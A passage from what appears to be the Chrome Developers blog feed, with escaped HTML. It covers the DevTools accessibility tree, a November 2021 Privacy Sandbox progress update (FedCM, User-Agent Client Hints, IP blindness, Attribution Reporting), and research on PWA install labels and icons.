1600w&quot; width=&quot;800&quot;&gt;\n&lt;p&gt;The caveat here is that this essentially means that we need to construct yet another tree than what is available on the backend. Say, for example, that we have nodes A, B, C, and X where A has child X and B, and X has child C. If X is an ignored node, we prune X from the tree and instead create a tree where C is a child to A.&lt;/p&gt;\n&lt;img alt=&quot;Diagram showing how we prune the tree.&quot; decoding=&quot;async&quot; height=&quot;450&quot; loading=&quot;lazy&quot; sizes=&quot;(min-width: 800px) 800px, calc(100vw - 48px)&quot; src=&quot;https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&quot; srcset=&quot;https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=200 200w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=228 228w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=260 260w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=296 296w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=338 338w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=385 385w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=439 439w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=500 500w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=571 571w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=650 650w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=741 741w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=845 845w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=964 964w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=1098 1098w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=1252 1252w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=1428 1428w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/DqQ4L3DRo6HTg8RIJnwO.png?auto=format&amp;w=1600 1600w&quot; width=&quot;800&quot;&gt;\n&lt;p&gt;On the frontend, we construct the full tree including ignored nodes and only prune them just before rendering the nodes. We do this for two reasons:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;strong&gt;It makes it much simpler to handle node updates from the backend&lt;/strong&gt;, since we have the same tree structure on both endpoints. For example, if the node B is removed in the example, we would receive an update for node X (since its children have changed), but if we had pruned that node we would struggle to figure out what to update.&lt;/li&gt;\n&lt;li&gt;&lt;strong&gt;It ensures that all DOM nodes have a corresponding accessibility node.&lt;/strong&gt; When the tree is toggled, we select the node corresponding to the node currently selected in the DOM tree. So for the previous example, if the user toggles the tree while the DOM node corresponding to X is selected, we inject X between the nodes A and B and select X in the tree. This allows the user to inspect the accessibility node for all DOM nodes and help determine why the node is ignored.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;future-ideas&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#future-ideas&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Future ideas&lt;/h2&gt;\n&lt;p&gt;Launching the new accessibility tree is just the start. We have a few ideas for future projects we could build on top of the new view, but we are also eager to &lt;a href=&quot;https://goo.gle/devtools-a11y-tree-feedback&quot;&gt;hear your feedback&lt;/a&gt;!&lt;/p&gt;\n&lt;h3 id=&quot;alternative-filterings&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#alternative-filterings&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Alternative filterings&lt;/h3&gt;\n&lt;p&gt;As explained above, we currently filter out nodes that are deemed uninteresting. We could provide a way to disable this behavior and show all nodes, or provide alternative filterings such as &lt;strong&gt;Show landmark nodes&lt;/strong&gt; or &lt;strong&gt;Show headings&lt;/strong&gt;.&lt;/p&gt;\n&lt;h3 id=&quot;highlight-a11y-issues&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#highlight-a11y-issues&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Highlight a11y issues&lt;/h3&gt;\n&lt;p&gt;We could incorporate an “accessibility best practice” analysis with the tree and highlight accessibility issues directly on the offending nodes.&lt;/p&gt;\n&lt;h3 id=&quot;surface-accessibility-actions-in-devtools&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#surface-accessibility-actions-in-devtools&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Surface accessibility actions in DevTools&lt;/h3&gt;\n&lt;p&gt;The tree we currently show is purely one-way: It allows us to get an idea of what information would be fed to assistive technology when browsing a specific webpage. Accessibility actions represent the communication in the other direction: They allow assistive technology to act on the presented UI. We could surface such actions in DevTools to allow actions such as “clicking”, scrolling, or changing values on the page using the API available to assistive technology.&lt;/p&gt;\n</content>\n  </entry>\n  \n  \n  <entry>\n    <title>Progress in the Privacy Sandbox (November 2021)</title>\n    <link href=\"https://developer.chrome.com/en/blog/progress-in-the-privacy-sandbox-2021-11/\" />\n    <updated>2021-11-30T00:00:00+00:00</updated>\n    <id>https://developer.chrome.com/en/blog/progress-in-the-privacy-sandbox-2021-11/</id>\n    \n      \n      \n      <author>\n        <name><name>Rowan Merewood</name></name>\n      </author>\n      \n    \n    <content type=\"html\">&lt;p&gt;Welcome to the November edition of &amp;quot;&lt;strong&gt;&lt;a href=&quot;https://developer.chrome.com/tags/progress-in-the-privacy-sandbox/&quot;&gt;Progress in the Privacy\nSandbox&lt;/a&gt;&lt;/strong&gt;,&amp;quot; tracking the milestones on\nthe path to phasing out third-party cookies in Chrome and working towards a more\nprivate web.

However, this does mean it&#39;s a\ngood time for testing and addressing questions, which we are always happy to\nhear about either on the &lt;a href=&quot;https://twitter.com/ChromiumDev&quot;&gt;@ChromiumDev Twitter&lt;/a&gt;\nor the &lt;a href=&quot;https://github.com/GoogleChromeLabs/privacy-sandbox-dev-support&quot;&gt;developer support\nrepo&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;h2 id=&quot;events&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#events&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Events&lt;/h2&gt;\n&lt;p&gt;At the beginning of November we hosted the Chrome Developer Summit, which\nincluded both a Privacy Sandbox segment in the keynote and a few related\nquestions in the Ask Me Anything (AMA) session. We&#39;ve &lt;a href=&quot;https://developer.chrome.com/docs/privacy-sandbox/cds21-update/&quot;&gt;added a summary for\nyou&lt;/a&gt; to read or watch that covers\nactivities and examples of what to expect as proposals progress through the\ndiscussion, testing, and scaled adoption phases.&lt;/p&gt;\n&lt;div class=&quot;youtube&quot;&gt;\n  &lt;iframe class=&quot;youtube__embed&quot; src=&quot;https://www.youtube.com/embed/_Ah_ODU3CvA&quot; title=&quot;youtube embed&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;\n&lt;/div&gt;\n&lt;h2 id=&quot;strengthen-cross-site-privacy-boundaries&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#strengthen-cross-site-privacy-boundaries&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Strengthen cross-site privacy boundaries&lt;/h2&gt;\n&lt;p&gt;Third-party cookies are a key mechanism that enables cross-site tracking.\nPhasing them out is a major milestone, but we also need to tackle other forms of\ncross-site storage or communication.&lt;/p&gt;\n&lt;h3 id=&quot;federated-credentials-management-api&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#federated-credentials-management-api&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Federated Credentials Management API&lt;/h3&gt;\n&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/WICG/FedCM&quot;&gt;Federated Credentials Management (FedCM)&lt;/a&gt;&lt;/strong&gt; is\nthe new, more meaningful name for the WebID proposal.  We&#39;ve reflected this\nchange in the &lt;a href=&quot;https://privacysandbox.com/timeline/&quot;&gt;Privacy Sandbox Timeline&lt;/a&gt;.\nFederated identity is a critical service for the web, but given that it&#39;s\nexplicitly used to share aspects of identity across other sites, there are\nimplementation details which overlap with cross-site tracking.&lt;/p&gt;\n&lt;p&gt;The Federated Credentials Management proposal explores a range of options: from\nsimple migration paths for existing solutions to more private methods of\nconnecting to services with the bare minimum of information shared.&lt;/p&gt;\n&lt;p&gt;November also included the bi-annual\n&lt;strong&gt;&lt;a href=&quot;https://www.chromium.org/events/blinkon-15&quot;&gt;BlinkOn&lt;/a&gt;&lt;/strong&gt; conference. Blink is\nthe rendering engine used by Chromium, and BlinkOn is where contributors gather\nfor engineering presentations and discussions on current projects. The November\nBlinkOn included an &lt;strong&gt;overview and Q&amp;amp;A session on FedCM&lt;/strong&gt;: you can &lt;a href=&quot;https://www.youtube.com/watch?v=9la0cBhVXac&quot;&gt;watch the\nrecording on YouTube&lt;/a&gt;.&lt;/p&gt;\n&lt;h2 id=&quot;preventing-covert-tracking&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#preventing-covert-tracking&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Preventing covert tracking&lt;/h2&gt;\n&lt;p&gt;As we reduce the options for explicit cross-site tracking, we also need to\naddress the areas of the web platform that expose identifying information which\nenables fingerprinting or covert tracking of users.&lt;/p&gt;\n&lt;h3 id=&quot;user-agent-string-reduction-and-user-agent-client-hints&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#user-agent-string-reduction-and-user-agent-client-hints&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; User-Agent string reduction and User-Agent Client Hints&lt;/h3&gt;\n&lt;p&gt;Progress continues on reducing the information available by default in Chrome&#39;s\nUser-Agent string and providing an improved, active method for requesting that\ndata via User-Agent Client Hints. We&#39;ve added a new &lt;strong&gt;&lt;a href=&quot;https://developer.chrome.com/docs/privacy-sandbox/user-agent/&quot;&gt;User-Agent\nReduction&lt;/a&gt; overview&lt;/strong&gt; to collate all the\ncurrent guidance and updates.&lt;/p&gt;\n&lt;p&gt;We published new testing resources to help prepare for the changes. The\n&lt;strong&gt;&lt;a href=&quot;https://developer.chrome.com/docs/privacy-sandbox/user-agent/snippets/&quot;&gt;User-Agent reduction code\nsnippets&lt;/a&gt;&lt;/strong&gt; provide a selection of\nexamples for transforming the current Chrome User-Agent string to the reduced\nformat. There is also the new &lt;code&gt;chrome://flags/#force-major-version-to-100&lt;/code&gt; entry\nwhich will let you check if the switch to a 3 digit major version causes your\nsite to malfunction or break.&lt;/p&gt;\n&lt;p&gt;We have published the &lt;strong&gt;&lt;a href=&quot;https://groups.google.com/a/chromium.org/g/blink-dev/c/yZh8Lwr34Ro&quot;&gt;Intent to Ship for\nSec-CH-UA-Full-Version-List&lt;/a&gt;&lt;/strong&gt;.\nThis addresses &lt;a href=&quot;https://github.com/WICG/ua-client-hints/issues/196&quot;&gt;ecosystem\nfeedback&lt;/a&gt; that the existing\nSec-CH-UA-Full-Version was too tightly bound to the primary browser brand as it\nonly provided a single value. For example, the current implementation shows:&lt;/p&gt;\n&lt;p&gt;⬇️ &lt;em&gt;Server response header&lt;/em&gt;&lt;/p&gt;\n&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Accept-CH: Sec-CH-UA-Full-Version&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;⬆️ &lt;em&gt;Browser request header&lt;/em&gt;&lt;/p&gt;\n&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Sec-CH-UA: &quot;Chromium&quot;;v=&quot;94&quot;, &quot;Google Chrome&quot;;v=&quot;94&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;&lt;br&gt;Sec-CH-UA-Full-Version: &quot;94.0.4606.124&quot;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;The updated version would provide:&lt;/p&gt;\n&lt;p&gt;⬇️ &lt;em&gt;Server response header&lt;/em&gt;&lt;/p&gt;\n&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Accept-CH: Sec-CH-UA-Full-Version-List&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;⬆️ &lt;em&gt;Browser request header&lt;/em&gt;&lt;/p&gt;\n&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Sec-CH-UA: &quot;Chromium&quot;;v=&quot;94&quot;, &quot;Google Chrome&quot;;v=&quot;94&quot;, &quot;Other browser&quot;;v=&quot;99&quot;&lt;br&gt;Sec-CH-UA-Full-Version-List: &quot;Chromium&quot;;v=&quot;94.0.4606.124&quot;, &quot;Google Chrome&quot;;v=&quot;94.0.4606.124&quot;, &quot;Other browser&quot;;v=&quot;99.88.77.66&quot;&lt;/code&gt;&lt;/pre&gt;\n&lt;div class=&quot;aside aside--note&quot;&gt;\n&lt;p&gt;If you are using &lt;code&gt;Sec-CH-UA-Full-Version&lt;/code&gt; then you should plan to migrate to\n&lt;code&gt;Sec-CH-UA-Full-Version-List&lt;/code&gt; as it will allow us to deprecate\n&lt;code&gt;Sec-CH-UA-Full-Version&lt;/code&gt; in the future.&lt;/p&gt;\n&lt;/div&gt;\n&lt;h3 id=&quot;ip-blindness&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#ip-blindness&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; IP blindness&lt;/h3&gt;\n&lt;p&gt;IP addresses by their nature often provide a unique identifier for a client\nenabling the necessary communication between browser and server. However, this\nalso means that a stable IP address over time passively provides a significant\namount of information that can be used for cross-site tracking.&lt;/p&gt;\n&lt;p&gt;The &lt;strong&gt;&lt;a href=&quot;https://github.com/bslassey/ip-blindness&quot;&gt;IP blindness proposal&lt;/a&gt;&lt;/strong&gt; (also\nknown as Global Network Address Translation Combined with Audited and Trusted\nCDN or HTTP-Proxy Eliminating Reidentification or &lt;strong&gt;Gnatcatcher&lt;/strong&gt;) details a two\npronged approach to addressing this issue. The first is &lt;a href=&quot;https://github.com/bslassey/ip-blindness/blob/master/near_path_nat.md&quot;&gt;Near-Path\nNAT&lt;/a&gt;\nwhich effectively forwards the browser&#39;s connection through an IP privatizing\nservice which hides the browser&#39;s IP address from the site being visited. The\nsecond option builds on the layered nature of the Internet where the\ninfrastructure that relies on IP address can be wholly separate from the\napplication running on top of it. The &lt;a href=&quot;https://github.com/bslassey/ip-blindness/blob/master/willful_ip_blindness.md&quot;&gt;Willful IP\nBlindness&lt;/a&gt;\nproposal explores methods of defining auditable policies for creating and\nmaintaining that separation.&lt;/p&gt;\n&lt;p&gt;Both of these ideas are early in the discussion phase with active progress in\nthe repo, such as the recently posted &lt;a href=&quot;https://github.com/bslassey/ip-blindness/blob/master/proposed_willful_ip_blindness_principles.md&quot;&gt;Willful IP Blindness\nPrinciples&lt;/a&gt;.\nYou can expect to see discussion continue there and if you&#39;re interested in the\nnetwork-level details, you can follow the &lt;a href=&quot;https://datatracker.ietf.org/wg/masque/about/&quot;&gt;Multiplexed Application Substrate\nover QUIC Encryption (MASQUE)&lt;/a&gt;\nWorking Group in the IETF.&lt;/p&gt;\n&lt;h2 id=&quot;measure-digital-ads&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#measure-digital-ads&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Measure digital ads&lt;/h2&gt;\n&lt;p&gt;As the companion to displaying ads without cross-site tracking, we need\nprivacy-preserving mechanisms to allow measurement of ad effectiveness.&lt;/p&gt;\n&lt;h3 id=&quot;attribution-reporting-api&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#attribution-reporting-api&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Attribution Reporting API&lt;/h3&gt;\n&lt;p&gt;The &lt;strong&gt;&lt;a href=&quot;https://developer.chrome.com/docs/privacy-sandbox/attribution-reporting/&quot;&gt;Attribution Reporting\nAPI&lt;/a&gt;&lt;/strong&gt; creates functionality to\nmeasure events on one site, like clicking or viewing an ad, that lead to a\nconversion on another site—without enabling cross-site tracking.&lt;/p&gt;\n&lt;p&gt;We continue to test the API and &lt;strong&gt;&lt;a href=&quot;https://groups.google.com/a/chromium.org/g/blink-dev/c/DdjaFmsb4fA&quot;&gt;the origin trial has been\nextended&lt;/a&gt;&lt;/strong&gt;\nthrough to Chrome 97. Current origin trial tokens expired on October 12th, so\nexisting testers need to apply for updated tokens to continue testing.&lt;/p&gt;\n&lt;p&gt;There are two new blog posts up with the latest details on event-level reporting\nin the API. &lt;strong&gt;&lt;a href=&quot;https://developer.chrome.com/docs/privacy-sandbox/attribution-reporting-event-introduction/&quot;&gt;Event-level reports in the Attribution Reporting\nAPI&lt;/a&gt;&lt;/strong&gt;\nintroduces the concepts and process while &lt;strong&gt;&lt;a href=&quot;https://developer.chrome.com/docs/privacy-sandbox/attribution-reporting-event-guide/&quot;&gt;Using event-level reports in the\nAttribution Reporting\nAPI&lt;/a&gt;&lt;/strong&gt; goes into the\nimplementation detail with accompanying demo and demo code.&lt;/p&gt;\n&lt;h2 id=&quot;feedback&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#feedback&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Feedback&lt;/h2&gt;\n&lt;p&gt;As we continue to publish these monthly updates, and progress through the\nPrivacy Sandbox as a whole, we want to make sure that developers receive the\ninformation and support that they need. Let us know on &lt;a href=&quot;https://twitter.com/ChromiumDev&quot;&gt;@ChromiumDev\nTwitter&lt;/a&gt; if there&#39;s anything that we could\nimprove in this series.

tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#introduction&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Introduction&lt;/h2&gt;\n&lt;p&gt;At the beginning of 2020, the Chrome team across mobile and desktop\nlaid out a plan to improve the discoverability and engagement of\ninstalled web apps. Our work led to a greater than 100% increase in\nPWA installation and engagement. We achieved this by researching\nexisting features, running A/B test experiments and user interviews\nto gain insight into users perceptions and expectations. This article\ncovers how we got there.&lt;/p&gt;\n&lt;h2 id=&quot;unified&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#unified&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Unified install language&lt;/h2&gt;\n&lt;p&gt;The call-to-action that triggers a PWA install was inconsistent across\nthe web platform. For Chrome on Android, we had settled on &lt;strong&gt;Add to\nhome screen&lt;/strong&gt;, but on our Desktop Platforms, we\nemphasized &lt;strong&gt;Install&lt;/strong&gt;. The rationale for this discrepancy came from\na study the team ran in 2016 that compared different strings. The\nteam found that &lt;strong&gt;Add to home screen&lt;/strong&gt; worked better, if only\nmarginally, on mobile.&lt;/p&gt;\n&lt;p&gt;A further study on taxonomy in 2019 found no difference, and so the\nteam wanting to unify the PWA install experience, decided to update\nthe label to &lt;strong&gt;Install&lt;/strong&gt; on Android. A further study in 2021 compared\nthe language, &lt;strong&gt;Install&lt;/strong&gt;, &lt;strong&gt;Get&lt;/strong&gt;, and &lt;strong&gt;Download&lt;/strong&gt;, and we found\nthat users understood &lt;strong&gt;Install&lt;/strong&gt; as the process that was happening.\nUsers felt tapping a button with the label &lt;strong&gt;Get&lt;/strong&gt; would send the user\nto a website, and with &lt;strong&gt;Download&lt;/strong&gt; they assumed a file would end up\nin their downloads folder or equivalent.&lt;/p&gt;\n&lt;p&gt;With all this in mind, we concluded that the label &lt;strong&gt;Install&lt;/strong&gt; best\nfits PWAs. We recommend developers across the web platform adopt\nInstall as the preferred string going forward.&lt;/p&gt;\n&lt;h2 id=&quot;installicon&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#installicon&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Install icon on desktop&lt;/h2&gt;\n&lt;p&gt;On our desktop platforms, we have a design pattern that whenever a website\nloads a PWA, Chrome will show a pill that appears on the right-hand side of the\nomnibox that contains an icon and the label &lt;strong&gt;Install&lt;/strong&gt;. After\nthat, when a user visits a site, only the icon will be present.\nClicking on this pill triggers the installation of a desktop\nPWA.&lt;/p&gt;\n&lt;figure&gt;\n&lt;img alt=&quot;Original install plus icon.&quot; decoding=&quot;async&quot; height=&quot;228&quot; loading=&quot;lazy&quot; sizes=&quot;(min-width: 660px) 660px, calc(100vw - 48px)&quot; src=&quot;https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&quot; srcset=&quot;https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=200 200w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=228 228w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=260 260w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=296 296w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=338 338w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=385 385w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=439 439w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=500 500w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=571 571w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=650 650w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=741 741w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=845 845w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=964 964w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=1098 1098w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=1252 1252w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/RCE9R8Shyh2bMPBZLSJO.png?auto=format&amp;w=1320 1320w&quot; width=&quot;660&quot;&gt;\n&lt;figcaption&gt;\nOriginal install plus icon.\n&lt;/figcaption&gt;\n&lt;/figure&gt;\n&lt;p&gt;The icon was initially a plus symbol, partly due to the &lt;strong&gt;Add to home\nscreen&lt;/strong&gt; metaphor used on mobile. However, as mentioned, the language\nwe used was &lt;strong&gt;Install&lt;/strong&gt;. The feedback we received from the developer\ncommunity was that this icon was confusing. Furthermore, if a user\nused the zoom function to enlarge text, the icon for zoom looked very\nsimilar, confusing the user even more.&lt;/p&gt;\n&lt;figure&gt;\n&lt;img alt=&quot;Omnibox bug with zoom and install icons present.&quot; decoding=&quot;async&quot; height=&quot;205&quot; loading=&quot;lazy&quot; sizes=&quot;(min-width: 660px) 660px, calc(100vw - 48px)&quot; src=&quot;https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&quot; srcset=&quot;https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=200 200w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=228 228w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=260 260w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=296 296w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=338 338w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=385 385w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=439 439w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=500 500w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=571 571w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=650 650w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=741 741w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=845 845w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=964 964w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=1098 1098w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=1252 1252w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/zliw3izVFXwgQcpxBS8n.png?auto=format&amp;w=1320 1320w&quot; width=&quot;660&quot;&gt;\n&lt;figcaption&gt;\nOmnibox bug with zoom and install icons present.\n&lt;/figcaption&gt;\n&lt;/figure&gt;\n&lt;p&gt;I decided to investigate our user&#39;s perception, as most feedback was\nanecdotal. Working with our UX researchers, we ran a study with\n10,000 users in the USA and Indonesia to determine users&#39;\nunderstanding of install iconography. We tested five different\ndesigns, including the existing one, and asked users what &amp;quot;Install&amp;quot;\nmeant. We discovered that the current icon, the plus symbol, was the\nmost confusing to our users. Many confused the symbol\nwith &amp;quot;medicine&amp;quot;, &amp;quot;first aid&amp;quot; and &amp;quot;batteries&amp;quot;.&lt;/p&gt;\n&lt;p&gt;We also found that users primarily associated imagery such as arrows\nand devices with the install. Based on these conclusions, we ran an\nA/B/C test in Chrome, comparing the existing design with two\nalternatives. We landed on the arrow pointing down into a monitor,\nwhich performed significantly better than the other two.

